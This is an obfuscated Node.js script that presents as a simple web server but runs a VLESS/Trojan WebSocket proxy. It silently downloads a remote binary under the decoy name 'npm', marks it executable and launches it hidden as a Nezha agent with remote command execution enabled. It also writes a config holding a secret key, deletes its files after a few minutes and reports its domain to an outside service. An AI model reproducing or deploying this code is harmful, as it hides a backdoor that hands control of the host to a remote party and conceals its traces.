const _0x4de14b=_0x3af6;(function(_0x5d561b,_0x2f7d56){const _0x5252fb=_0x3af6,_0x3d706c=_0x5d561b();while(!![]){try{const _0x55acb5=-parseInt(_0x5252fb(0x162))/0x1+parseInt(_0x5252fb(0x18b))/0x2*(parseInt(_0x5252fb(0x15d))/0x3)+parseInt(_0x5252fb(0x1a4))/0x4+-parseInt(_0x5252fb(0x173))/0x5*(-parseInt(_0x5252fb(0x181))/0x6)+parseInt(_0x5252fb(0x179))/0x7*(-parseInt(_0x5252fb(0x191))/0x8)+-parseInt(_0x5252fb(0x183))/0x9+-parseInt(_0x5252fb(0x194))/0xa;if(_0x55acb5===_0x2f7d56)break;else _0x3d706c['push'](_0x3d706c['shift']());}catch(_0x3097fd){_0x3d706c['push'](_0x3d706c['shift']());}}}(_0x582e,0x19d08));const os=require('os'),http=require(_0x4de14b(0x15a)),fs=require('fs'),axios=require(_0x4de14b(0x165)),net=require('net'),path=require(_0x4de14b(0x1b0)),crypto=require(_0x4de14b(0x1b3)),{Buffer}=require(_0x4de14b(0x1aa)),{exec,execSync}=require(_0x4de14b(0x160)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x4de14b(0x17c),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x4de14b(0x174),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x4de14b(0x1a5)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x4de14b(0x152),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';const GetISP=async()=>{const _0x14368b=_0x4de14b;try{const _0xc9ed67=await axios['get'](_0x14368b(0x19f)),_0x476664=_0xc9ed67[_0x14368b(0x189)];ISP=(_0x476664[_0x14368b(0x18d)]+'-'+_0x476664[_0x14368b(0x1c3)])[_0x14368b(0x17a)](/ /g,'_');}catch(_0x5b08cb){ISP=_0x14368b(0x166);}};GetISP();const httpServer=http[_0x4de14b(0x1ba)]((_0xd4e395,_0x22b7d7)=>{const _0x15b3ec=_0x4de14b;if(_0xd4e395['url']==='/'){const _0xee5563=path[_0x15b3ec(0x1ac)](__dirname,_0x15b3ec(0x1b4));fs['readFile'](_0xee5563,_0x15b3ec(0x1ab),(_0x2da718,_0x37a503)=>{const _0x64695a=_0x15b3ec;if(_0x2da718){_0x22b7d7[_0x64695a(0x14d)](0xc8,{'Content-Type':_0x64695a(0x15f)}),_0x22b7d7[_0x64695a(0x178)](_0x64695a(0x170));return;}_0x22b7d7[_0x64695a(0x14d)](0xc8,{'Content-Type':_0x64695a(0x15f)}),_0x22b7d7['end'](_0x37a503);});return;}else{if(_0xd4e395[_0x15b3ec(0x1ae)]==='/'+SUB_PATH){const _0x3d42ba=NAME?NAME+'-'+ISP:ISP,_0x5c7fe7=_0x15b3ec(0x169)+UUID+'@'+DOMAIN+_0x15b3ec(0x16b)+DOMAIN+_0x15b3ec(0x1a3)+DOMAIN+_0x15b3ec(0x14f)+WSPATH+'#'+_0x3d42ba,_0x41d9cc=_0x15b3ec(0x18f)+UUID+'@'+DOMAIN+_0x15b3ec(0x171)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x15b3ec(0x14f)+WSPATH+'#'+_0x3d42ba,_0x2a1aff=_0x5c7fe7+'\x0a'+_0x41d9cc,_0x42b25e=Buffer[_0x15b3ec(0x14c)](_0x2a1aff)[_0x15b3ec(0x15b)](_0x15b3ec(0x16d));_0x22b7d7[_0x15b3ec(0x14d)](0xc8,{'Content-Type':_0x15b3ec(0x158)}),_0x22b7d7['end'](_0x42b25e+'\x0a');}else _0x22b7d7[_0x15b3ec(0x14d)](0x194,{'Content-Type':_0x15b3ec(0x158)}),_0x22b7d7['end'](_0x15b3ec(0x153));}}),wss=new WebSocket[(_0x4de14b(0x175))]({'server':httpServer}),uuid=UUID[_0x4de14b(0x17a)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4de14b(0x155)];function resolveHost(_0xbfb544){return new Promise((_0x3ff50c,_0x3d2f59)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xbfb544)){_0x3ff50c(_0xbfb544);return;}let _0x54cf04=0x0;function _0xa404f1(){const _0x655dd1=_0x3af6;if(_0x54cf04>=DNS_SERVERS[_0x655dd1(0x151)]){_0x3d2f59(new Error('Failed\x20to\x20resolve\x20'+_0xbfb544+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3d1906=DNS_SERVERS[_0x54cf04];_0x54cf04++;const _0x114ef2=_0x655dd1(0x1a1)+encodeURIComponent(_0xbfb544)+_0x655dd1(0x17f);axios[_0x655dd1(0x14e)](_0x114ef2,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x206b25=>{const _0x31ec28=_0x655dd1,_0x10167f=_0x206b25[_0x31ec28(0x189)];if(_0x10167f['Status']===0x0&&_0x10167f[_0x31ec28(0x188)]&&_0x10167f[_0x31ec28(0x188)]['length']>0x0){const _0x31c2ed=_0x10167f[_0x31ec28(0x188)]['find'](_0x4f56ce=>_0x4f56ce[_0x31ec28(0x1af)]===0x1);if(_0x31c2ed){_0x3ff50c(_0x31c2ed[_0x31ec28(0x189)]);return;}}_0xa404f1();})[_0x655dd1(0x1c5)](_0x251b85=>{_0xa404f1();});}_0xa404f1();});}function handleVlessConnection(_0x44aee4,_0x6184cd){const _0x4afdb9=_0x4de14b,[_0x5d75f0]=_0x6184cd,_0x3f3682=_0x6184cd['slice'](0x1,0x11);if(!_0x3f3682[_0x4afdb9(0x19d)]((_0x197a21,_0x24bb86)=>_0x197a21==parseInt(uuid[_0x4afdb9(0x1c1)](_0x24bb86*0x2,0x2),0x10)))return![];let _0x189f7d=_0x6184cd[_0x4afdb9(0x1a5)](0x11,0x12)[_0x4afdb9(0x15e)]()+0x13;const _0x55fec8=_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d,_0x189f7d+=0x2)['readUInt16BE'](0x0),_0x49f377=_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d,_0x189f7d+=0x1)[_0x4afdb9(0x15e)](),_0x362c9b=_0x49f377==0x1?_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d,_0x189f7d+=0x4)[_0x4afdb9(0x1ac)]('.'):_0x49f377==0x2?new TextDecoder()['decode'](_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d+0x1,_0x189f7d+=0x1+_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d,_0x189f7d+0x1)['readUInt8']())):_0x49f377==0x3?_0x6184cd[_0x4afdb9(0x1a5)](_0x189f7d,_0x189f7d+=0x10)[_0x4afdb9(0x176)]((_0x48b0a7,_0x2191ae,_0x2bb087,_0x2b5fac)=>_0x2bb087%0x2?_0x48b0a7[_0x4afdb9(0x19e)](_0x2b5fac[_0x4afdb9(0x1a5)](_0x2bb087-0x1,_0x2bb087+0x1)):_0x48b0a7,[])[_0x4afdb9(0x17d)](_0x578181=>_0x578181['readUInt16BE'](0x0)['toString'](0x10))[_0x4afdb9(0x1ac)](':'):'';_0x44aee4[_0x4afdb9(0x1b2)](new Uint8Array([_0x5d75f0,0x0]));const _0x47f5fe=createWebSocketStream(_0x44aee4);return resolveHost(_0x362c9b)['then'](_0x17ea48=>{const _0x14e4b1=_0x4afdb9;net[_0x14e4b1(0x192)]({'host':_0x17ea48,'port':_0x55fec8},function(){const _0x9fc8fa=_0x14e4b1;this[_0x9fc8fa(0x18a)](_0x6184cd[_0x9fc8fa(0x1a5)](_0x189f7d)),_0x47f5fe['on'](_0x9fc8fa(0x185),()=>{})[_0x9fc8fa(0x1bd)](this)['on'](_0x9fc8fa(0x185),()=>{})[_0x9fc8fa(0x1bd)](_0x47f5fe);})['on'](_0x14e4b1(0x185),()=>{});})['catch'](_0x33c16c=>{const _0x469962=_0x4afdb9;net[_0x469962(0x192)]({'host':_0x362c9b,'port':_0x55fec8},function(){const _0x38e06d=_0x469962;this['write'](_0x6184cd[_0x38e06d(0x1a5)](_0x189f7d)),_0x47f5fe['on'](_0x38e06d(0x185),()=>{})[_0x38e06d(0x1bd)](this)['on'](_0x38e06d(0x185),()=>{})[_0x38e06d(0x1bd)](_0x47f5fe);})['on'](_0x469962(0x185),()=>{});}),!![];}function handleTrojanConnection(_0x409c19,_0x392714){const _0x1eafd0=_0x4de14b;try{if(_0x392714['length']<0x3a)return![];const _0x3d454f=_0x392714[_0x1eafd0(0x1a5)](0x0,0x38)[_0x1eafd0(0x15b)](),_0x580ed8=[UUID];let _0x47123a=null;for(const _0x3df692 of _0x580ed8){const _0x12df91=crypto[_0x1eafd0(0x164)](_0x1eafd0(0x180))['update'](_0x3df692)['digest'](_0x1eafd0(0x190));if(_0x12df91===_0x3d454f){_0x47123a=_0x3df692;break;}}if(!_0x47123a)return![];let _0x2beb04=0x38;_0x392714[_0x2beb04]===0xd&&_0x392714[_0x2beb04+0x1]===0xa&&(_0x2beb04+=0x2);const _0x553df4=_0x392714[_0x2beb04];if(_0x553df4!==0x1)return![];_0x2beb04+=0x1;const _0x4aea5b=_0x392714[_0x2beb04];_0x2beb04+=0x1;let _0x41f9bc,_0x542a8f;if(_0x4aea5b===0x1)_0x41f9bc=_0x392714[_0x1eafd0(0x1a5)](_0x2beb04,_0x2beb04+0x4)[_0x1eafd0(0x1ac)]('.'),_0x2beb04+=0x4;else{if(_0x4aea5b===0x3){const _0x13f81b=_0x392714[_0x2beb04];_0x2beb04+=0x1,_0x41f9bc=_0x392714[_0x1eafd0(0x1a5)](_0x2beb04,_0x2beb04+_0x13f81b)[_0x1eafd0(0x15b)](),_0x2beb04+=_0x13f81b;}else{if(_0x4aea5b===0x4)_0x41f9bc=_0x392714[_0x1eafd0(0x1a5)](_0x2beb04,_0x2beb04+0x10)['reduce']((_0x59c7b5,_0xed0cf3,_0x32a688,_0x34a232)=>_0x32a688%0x2?_0x59c7b5[_0x1eafd0(0x19e)](_0x34a232[_0x1eafd0(0x1a5)](_0x32a688-0x1,_0x32a688+0x1)):_0x59c7b5,[])[_0x1eafd0(0x17d)](_0xf7ffa8=>_0xf7ffa8[_0x1eafd0(0x1a8)](0x0)[_0x1eafd0(0x15b)](0x10))[_0x1eafd0(0x1ac)](':'),_0x2beb04+=0x10;else return![];}}_0x542a8f=_0x392714[_0x1eafd0(0x1a8)](_0x2beb04),_0x2beb04+=0x2;_0x2beb04<_0x392714['length']&&_0x392714[_0x2beb04]===0xd&&_0x392714[_0x2beb04+0x1]===0xa&&(_0x2beb04+=0x2);const _0x253adc=createWebSocketStream(_0x409c19);return resolveHost(_0x41f9bc)['then'](_0x2d5ae2=>{net['connect']({'host':_0x2d5ae2,'port':_0x542a8f},function(){const _0x6d9a62=_0x3af6;_0x2beb04<_0x392714[_0x6d9a62(0x151)]&&this[_0x6d9a62(0x18a)](_0x392714['slice'](_0x2beb04)),_0x253adc['on'](_0x6d9a62(0x185),()=>{})[_0x6d9a62(0x1bd)](this)['on'](_0x6d9a62(0x185),()=>{})['pipe'](_0x253adc);})['on']('error',()=>{});})[_0x1eafd0(0x1c5)](_0x2bbfea=>{const _0x5dc7c1=_0x1eafd0;net[_0x5dc7c1(0x192)]({'host':_0x41f9bc,'port':_0x542a8f},function(){const _0x12c83d=_0x5dc7c1;_0x2beb04<_0x392714[_0x12c83d(0x151)]&&this[_0x12c83d(0x18a)](_0x392714[_0x12c83d(0x1a5)](_0x2beb04)),_0x253adc['on'](_0x12c83d(0x185),()=>{})['pipe'](this)['on'](_0x12c83d(0x185),()=>{})[_0x12c83d(0x1bd)](_0x253adc);})['on'](_0x5dc7c1(0x185),()=>{});}),!![];}catch(_0x597de9){return![];}}wss['on'](_0x4de14b(0x1bb),(_0x26b04c,_0x29c0f2)=>{const _0x26d4c1=_0x4de14b,_0x57e2cd=_0x29c0f2[_0x26d4c1(0x1ae)]||'';_0x26b04c[_0x26d4c1(0x199)](_0x26d4c1(0x1be),_0xeafffe=>{const _0x4d5ff4=_0x26d4c1;if(_0xeafffe[_0x4d5ff4(0x151)]>0x11&&_0xeafffe[0x0]===0x0){const _0x250708=_0xeafffe[_0x4d5ff4(0x1a5)](0x1,0x11),_0x7831e6=_0x250708['every']((_0xe3b062,_0x1ccb84)=>_0xe3b062==parseInt(uuid[_0x4d5ff4(0x1c1)](_0x1ccb84*0x2,0x2),0x10));if(_0x7831e6){!handleVlessConnection(_0x26b04c,_0xeafffe)&&_0x26b04c[_0x4d5ff4(0x159)]();return;}}!handleTrojanConnection(_0x26b04c,_0xeafffe)&&_0x26b04c['close']();})['on'](_0x26d4c1(0x185),()=>{});});const getDownloadUrl=()=>{const _0x300f6b=_0x4de14b,_0x8e9244=os[_0x300f6b(0x16c)]();return _0x8e9244===_0x300f6b(0x157)||_0x8e9244===_0x300f6b(0x1b7)||_0x8e9244===_0x300f6b(0x198)?!NEZHA_PORT?_0x300f6b(0x187):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x300f6b(0x1b5):_0x300f6b(0x1c4);},downloadFile=async()=>{const _0x46de59=_0x4de14b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x11f5a5=getDownloadUrl(),_0x533c88=await axios({'method':_0x46de59(0x14e),'url':_0x11f5a5,'responseType':_0x46de59(0x154)}),_0x2e69d7=fs[_0x46de59(0x168)](_0x46de59(0x167));return _0x533c88[_0x46de59(0x189)][_0x46de59(0x1bd)](_0x2e69d7),new Promise((_0x5cda84,_0x2d405b)=>{const _0x5369bf=_0x46de59;_0x2e69d7['on'](_0x5369bf(0x1ad),()=>{const _0x2ded17=_0x5369bf;console[_0x2ded17(0x16a)](_0x2ded17(0x150)),exec(_0x2ded17(0x172),_0x5299f0=>{if(_0x5299f0)_0x2d405b(_0x5299f0);_0x5cda84();});}),_0x2e69d7['on'](_0x5369bf(0x185),_0x2d405b);});}catch(_0x2be103){throw _0x2be103;}},runnz=async()=>{const _0x278876=_0x4de14b;try{const _0x5e9eea=execSync(_0x278876(0x18e),{'encoding':'utf-8'});if(_0x5e9eea[_0x278876(0x1b8)]()!==''){console['log'](_0x278876(0x195));return;}}catch(_0x35c073){}await downloadFile();let _0x1827ea='',_0x357e66=[_0x278876(0x163),_0x278876(0x1a2),_0x278876(0x19c),_0x278876(0x196),'2083',_0x278876(0x1bf)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4377f1=_0x357e66[_0x278876(0x1bc)](NEZHA_PORT)?_0x278876(0x161):'';_0x1827ea=_0x278876(0x197)+NEZHA_SERVER+':'+NEZHA_PORT+_0x278876(0x16f)+NEZHA_KEY+'\x20'+_0x4377f1+_0x278876(0x193);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x255f12=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x278876(0x14b)](':')[_0x278876(0x17e)]():'',_0x61bad5=_0x357e66[_0x278876(0x1bc)](_0x255f12)?_0x278876(0x1a7):_0x278876(0x1c2),_0x2644a9=_0x278876(0x19b)+NEZHA_KEY+_0x278876(0x1b9)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x61bad5+_0x278876(0x19a)+UUID;fs[_0x278876(0x1b1)](_0x278876(0x18c),_0x2644a9);}_0x1827ea=_0x278876(0x1a9);}else{console[_0x278876(0x16a)](_0x278876(0x156));return;}}try{exec(_0x1827ea,{'shell':_0x278876(0x186)},_0x1b3c35=>{const _0xc57da6=_0x278876;if(_0x1b3c35)console[_0xc57da6(0x185)](_0xc57da6(0x184),_0x1b3c35);else console[_0xc57da6(0x16a)](_0xc57da6(0x1b6));});}catch(_0x1b5516){console['error'](_0x278876(0x1a0)+_0x1b5516);}};function _0x582e(){const _0x47d303=['createHash','axios','Unknown','npm','createWriteStream','vless://','log',':443?encryption=none&security=tls&sni=','arch','base64','post','\x20-p\x20','Hello\x20world!',':443?security=tls&sni=','chmod\x20+x\x20npm','733835soJfwl','1234.abc.com','Server','reduce','listen','end','3682SNWDBE','replace','https://','a3c8f1b2-e7d9-4c6a-8f15-29b0e3d4a7f1','map','pop','&type=A','sha224','6YXVZMx','application/json','485154ElvTgE','npm\x20running\x20error:','error','/bin/bash','https://arm64.ssss.nyc.mn/v1','Answer','data','write','10226XMJLfq','config.yaml','country_code','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trojan://','hex','136siwKCF','connect','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','753380yhmyPg','npm\x20is\x20already\x20running,\x20skip\x20running...','2087','setsid\x20nohup\x20./npm\x20-s\x20','aarch64','once','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','client_secret:\x20','2096','every','concat','https://api.ip.sb/geoip','error:\x20','https://dns.google/resolve?name=','8443','&fp=chrome&type=ws&host=','587964VNKvAt','slice','unlink','true','readUInt16BE','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','buffer','utf8','join','finish','url','type','path','writeFileSync','send','crypto','index.html','https://amd64.ssss.nyc.mn/v1','npm\x20is\x20running','arm64','trim','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createServer','connection','includes','pipe','message','2053','Server\x20is\x20running\x20on\x20port\x20','substr','false','isp','https://amd64.ssss.nyc.mn/agent','catch','split','from','writeHead','get','&path=%2F','npm\x20download\x20successfully','length','sub','Not\x20Found\x0a','stream','1.1.1.1','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','arm','text/plain','close','http','toString','Automatic\x20Access\x20Task\x20added\x20successfully','9HkmfNX','readUInt8','text/html','child_process','--tls','65175hszzYV','443'];_0x582e=function(){return _0x47d303;};return _0x582e();}function _0x3af6(_0x8418f3,_0xeefbd1){_0x8418f3=_0x8418f3-0x14b;const _0x582ec1=_0x582e();let _0x3af6e5=_0x582ec1[_0x8418f3];return _0x3af6e5;}async function addAccessTask(){const _0x4e4034=_0x4de14b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x489b2a=_0x4e4034(0x17b)+DOMAIN;try{const _0x132b4a=await axios[_0x4e4034(0x16e)]('https://oooo.serv00.net/add-url',{'url':_0x489b2a},{'headers':{'Content-Type':_0x4e4034(0x182)}});console[_0x4e4034(0x16a)](_0x4e4034(0x15c));}catch(_0x333d9a){}}const delFiles=()=>{const _0x388730=_0x4de14b;fs[_0x388730(0x1a6)](_0x388730(0x167),()=>{}),fs[_0x388730(0x1a6)](_0x388730(0x18c),()=>{});};httpServer[_0x4de14b(0x177)](PORT,()=>{const _0x8586f1=_0x4de14b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x8586f1(0x16a)](_0x8586f1(0x1c0)+PORT);});
